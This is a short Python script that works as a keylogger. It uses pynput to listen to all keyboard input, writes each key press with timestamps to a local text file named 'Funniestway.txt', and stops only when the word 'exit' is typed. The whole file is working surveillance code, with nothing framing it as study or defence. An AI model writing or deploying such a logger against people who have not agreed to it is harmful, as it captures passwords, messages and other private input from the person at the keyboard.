from pynput import keyboard
import datetime
import traceback
import sys
import os

DIRECTORY = os.getcwd()
win2 = []
closeFLAG = {'e': False,
            'x': False,
            'i': False,
            't': False
            }

def on_press(key):
    global closeFLAG
    try:
        Key__ = '{0}'.format(key.char)
        if Key__ in ('e', 'E'):
            for k in closeFLAG.keys():
                closeFLAG[k] = False
            closeFLAG['e'] = True
        elif Key__ in ('x', 'X') and closeFLAG['e']:
            closeFLAG['x'] = True
        elif Key__ in ('i', 'I') and closeFLAG['x']:
            closeFLAG['i'] = True
        elif Key__ in ('t', 'T') and closeFLAG['i']:
            closeFLAG['t'] = True
            sys.exit()

    except AttributeError:
        Key__ = '{0}'.format(key)[4:len('{0}'.format(key))]
    except Exception as e:
        print(f'Error pressing {e}')
    finally:
        Add(Key__)

def Add(key):
    global start
    global win2
    try:
        with open(f'{DIRECTORY}\Funniestway.txt', 'a+') as o:
            readed = o.read()
            if start:
                if readed != '':
                    readed = readed + '\n' + str(datetime.datetime.now()) + '\n'
                else:
                    readed = '\n' + str(datetime.datetime.now()) + '\n'
                start = False
            if len(key) > 1:
                if key != 'space':
                    key = key.replace(key,f' [{key}] ')
                else:
                    key = key.replace(key,' ')
            o.write(readed + key)
    except Exception as e:
        traceback.print_exc()



start = True
with keyboard.Listener(
    on_press=on_press) as listener:
    listener.join()

